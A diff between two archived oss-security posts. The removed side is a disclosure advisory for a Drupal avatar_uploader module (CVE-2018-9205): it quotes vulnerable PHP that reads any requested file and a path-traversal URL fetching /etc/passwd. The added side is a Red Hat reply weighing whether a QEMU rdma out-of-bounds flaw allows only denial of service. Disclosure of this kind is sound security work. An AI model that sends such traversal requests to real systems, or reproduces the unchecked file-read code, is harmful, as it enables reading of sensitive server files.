@@ -1,31 +1,26 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/04/12/1
-Message-id: <3B4F690F-2918-4282-BEBE-E163F07D205F@me.com>
-Date: Thu, 12 Apr 2018 08:28:15 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Arbitrary file download vulnerability in Drupal module avatar_uploader v7.x-1.0-beta8
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/12/18/5
+Message-ID: <nycvar.YSQ.7.76.1812181620570.9216@xnncv>
+Date: Tue, 18 Dec 2018 16:44:07 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: saar amar <saaramar5@...il.com>
+cc: oss security list <oss-security@...ts.openwall.com>
+Subject: Re: CVE-2018-20124 QEMU: rdma: OOB access when building scatter-gather array
 Content-Type: text/plain; charset=utf-8
 
-Title: Arbitrary file download vulnerability in Drupal module avatar_uploader v7.x-1.0-beta8
-Author: Larry W. Cashdollar
-Date: 2018-03-30
-CVE-ID:[CVE-2018-9205]
-Download Site: https://www.drupal.org/project/avatar_uploader
-Vendor: https://www.drupal.org/u/robbinzhao
-Vendor Notified: 2018-04-02
-Vendor Contact: https://www.drupal.org/project/avatar_uploader/issues/2957966#comment-12554146
-Advisory: http://www.vapidlabs.com/advisory.php?v=202
-Description: This module used Simple Ajax Uploader, and provide a basic uploader panel, for more effect, you can do your custom javascript. Such as, users' mouse hover on avatar, the edit link will slideup, or others.
-Vulnerability:
-The view.php contains code to retrieve files but no code to verify a user should be able to view files or keep them from changing the path to outside of the uploadDir directory:
++-- On Tue, 18 Dec 2018, saar amar wrote --+
+| I'm wondering why it says "DOS" and not "execute arbitrary code on the host, 
+| in the context of the QEMU process"? I have stack overflow, it pretty clear 
+| I could gain more than simple DOS:)
+| 
+| What do your day?
 
-<?php
+IIUC, it's likely to corrupt adjacent stack variables and/or hit stack canary 
+resulting in DoS. The scatter/gather entry object(struct ibv_sge) holds buffer 
+address/length attributes used during r/w operations. If their values are 
+astray, the following call to ibv_post_send() may suffer/return an error.
 
-$file = $_GET['file'];
-
-echo file_get_contents("uploadDir/$file");
-exit;
-
-Exploit Code:
-	• http://example.com/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
